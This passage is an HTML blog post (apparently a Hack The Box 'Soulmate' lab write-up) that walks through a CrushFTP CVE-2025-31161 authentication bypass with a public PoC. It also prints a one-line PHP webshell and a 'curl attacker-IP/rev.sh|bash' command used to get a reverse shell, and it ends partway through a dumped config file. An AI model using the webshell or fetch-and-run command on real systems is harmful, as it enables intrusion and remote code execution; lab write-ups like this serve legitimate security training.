@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/02/15/hackthebox-soulmate/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSoulmate is an easy-difficulty machine from Hack The Box that starts with subdomain enumeration revealing an exposed CrushFTP web interface vulnerable to CVE-2025-31161, an authentication bypa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Soulmate">
+<meta property="og:url" content="http://fouedsaidi.com/2026/02/15/Hackthebox-Soulmate/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSoulmate is an easy-difficulty machine from Hack The Box that starts with subdomain enumeration revealing an exposed CrushFTP web interface vulnerable to CVE-2025-31161, an authentication bypa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/Soulmate.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/web1.jpg">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/web2.jpg">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/web3.jpg">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/web4.jpg">
+<meta property="article:published_time" content="2026-02-15T15:29:21.000Z">
+<meta property="article:modified_time" content="2026-02-15T15:33:26.711Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Soulmate/Soulmate.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Soulmate -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Soulmate</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-15 18:29:21</span>
+        <span class="mobile">2026-02-15 18:29:21</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-15 18:33:26</span>
+            <span class="mobile">2026-02-15 18:33:26</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Soulmate is an easy-difficulty machine from Hack The Box that starts with subdomain enumeration revealing an exposed CrushFTP web interface vulnerable to CVE-2025-31161, an authentication bypass allowing us to create a privileged admin user. Through the admin panel, we change an existing user’s password and upload a webshell to gain initial access. Enumeration reveals hardcoded credentials in a PHP configuration file that grants us SSH access as user ben. For privilege escalation, we discover an Erlang SSH daemon running internally on port 2222 that executes commands with elevated privileges through the Erlang shell, allowing us to read the root flag.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Soulmate/Soulmate.png"
+                      alt="Soulmate-info-card"
+                ><figcaption>Soulmate-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://soulmate.htb/</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see we have our usual ssh 22 port and a web application deployed on port 80 redirecting us towards <code>soulmate.htb</code> which we will add to <code>/etc/hosts</code>.</p>
+<h3 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ ffuf -w /snap/seclists/current/Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="string">&quot;Host: FUZZ.soulmate.htb&quot;</span> -u <span class="string">&quot;http://10.10.11.86&quot;</span> -fs 154</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.11.86</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.soulmate.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 154</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 283ms]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Running ffuf on the host to check if there are any hidden subdomains, we find an <code>ftp</code> subdomain which we will also add to <code>/etc/hosts</code>.</p>
+<h2 id="Web-Application-CrushFTP-WebInterface"><a href="#Web-Application-CrushFTP-WebInterface" class="headerlink" title="Web Application - CrushFTP WebInterface"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://ftp.soulmate.htb/WebInterface/login.html" >CrushFTP WebInterface <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Soulmate/web1.jpg"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Checking the source code, we  will find the application version:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|   |</span><br><span class="line">|---|</span><br><span class="line">|.register(&quot;/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52&quot;)|</span><br><span class="line">||</span><br></pre></td></tr></table></figure></div>
+
+<p>Doing some googling we will find <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161" >NVD - CVE-2025-31161 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is an authentication bypass and takeover of the crushadmin account.</p>
+<p>We can find <a class="link"   target="_blank" rel="noopener" href="https://github.com/f4dee-backup/CVE-2025-31161" >this PoC to use <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>We will run the exploit now to create a privileged user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~/CVE-2025-31161$ <span class="built_in">ls</span></span><br><span class="line">CVE-2025-31161.sh  LICENSE  README.md  requirements.txt</span><br><span class="line">kujen@kujen:~/CVE-2025-31161$ ./C</span><br><span class="line">-bash: ./C: No such file or directory</span><br><span class="line">kujen@kujen:~/CVE-2025-31161$ <span class="built_in">chmod</span> +x CVE-2025-31161.sh</span><br><span class="line">kujen@kujen:~/CVE-2025-31161$ ./CVE-2025-31161.sh</span><br><span class="line"></span><br><span class="line">[+] Usage: ././CVE-2025-31161.sh --url &lt;http://target.com&gt; --port &lt;PORT&gt; --target-user &lt;admin_user&gt; --new-user &lt;new_user&gt; --new-password &lt;password&gt;</span><br><span class="line"></span><br><span class="line">[?] Parameters description:</span><br><span class="line"></span><br><span class="line">        --url            Target base URL (e.g., http://target)</span><br><span class="line">        --port           Port <span class="built_in">where</span> CrushFTP is running</span><br><span class="line">        --target-user    Valid or invalid username (e.g., crushadmin)</span><br><span class="line">        --new-user       Username to be created (e.g., Pwn3d)</span><br><span class="line">        --new-password   Password <span class="keyword">for</span> the new user</span><br><span class="line">        --<span class="built_in">help</span>           Show this <span class="built_in">help</span> panel</span><br><span class="line"></span><br><span class="line">[i] Example: bash ././CVE-2025-31161.sh --url http://target.com --port 80 --target-user crushadmin --new-user evilUser --new-password pass12345</span><br><span class="line"></span><br><span class="line">kujen@kujen:~/CVE-2025-31161$ ./CVE-2025-31161.sh --url http://ftp.soulmate.htb/ --port 80 --target-user crushadmin --new-user evilUser --new-password pass12345</span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">if</span> the server is online... Waiting...</span><br><span class="line"></span><br><span class="line">[*] Server is online. Starting preparation phase...</span><br><span class="line">[*] Generating dynamic CrushAuth token...</span><br><span class="line">[i] CrushAuth generated: 1672889411569_o09ZzBWKm2qFdbKFHvqKvMLhYk1892</span><br><span class="line">[*] Sending warm-up request to the server...</span><br><span class="line">[*] Sending user creation payload <span class="keyword">for</span> <span class="string">&#x27;evilUser&#x27;</span>...</span><br><span class="line"></span><br><span class="line">[&gt;] User successfully created: evilUser</span><br><span class="line">[*] Credentials:</span><br><span class="line">        Username: evilUser</span><br><span class="line">        Password: pass12345</span><br><span class="line">kujen@kujen:~/CVE-2025-31161$</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Soulmate/web2.jpg"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Soulmate/web3.jpg"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>We go to user manager and change <code>ben</code> user password:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Soulmate/web4.jpg"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>We go to <code>webProd</code> and upload rev.php reverse shell script:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>We go to <code>http://soulmate.htb/rev.php?cmd=curl+10.10.16.35/rev.sh|bash</code> and get shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/soulmate.htb/config</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">config.php</span><br><span class="line">$ <span class="built_in">cat</span> config.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Database &#123;</span><br><span class="line">    private <span class="variable">$db_file</span> = <span class="string">&#x27;../data/soulmate.db&#x27;</span>;</span><br><span class="line">    private <span class="variable">$pdo</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$this</span>-&gt;createTables();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">connect</span></span>() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // Create data directory <span class="keyword">if</span> it doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">            $dataDir = dirname($this-&gt;db_file);</span></span><br><span class="line"><span class="string">            if (!is_dir($dataDir)) &#123;</span></span><br><span class="line"><span class="string">                mkdir($dataDir, 0755, true);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $this-&gt;pdo = new PDO(&#x27;</span>sqlite:<span class="string">&#x27; . $this-&gt;db_file);</span></span><br><span class="line"><span class="string">            $this-&gt;pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="string">            $this-&gt;pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span></span><br><span class="line"><span class="string">        &#125; catch (PDOException $e) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;Connection failed: &quot; . $e-&gt;getMessage());</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    private function createTables() &#123;</span></span><br><span class="line"><span class="string">        $sql = &quot;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">            id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">            username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">            password TEXT NOT NULL,</span></span><br><span class="line"><span class="string">            is_admin INTEGER DEFAULT 0,</span></span><br><span class="line"><span class="string">            name TEXT,</span></span><br><span class="line"><span class="string">            bio TEXT,</span></span><br><span class="line"><span class="string">            interests TEXT,</span></span><br><span class="line"><span class="string">            phone TEXT,</span></span><br><span class="line"><span class="string">            profile_pic TEXT,</span></span><br><span class="line"><span class="string">            last_login DATETIME,</span></span><br><span class="line"><span class="string">            created_at DATETIME DEFAULT CURRENT_TIMESTAMP</span></span><br><span class="line"><span class="string">        )&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $this-&gt;pdo-&gt;exec($sql);</span></span><br><span class="line"><span class="string"></span></span><br><span 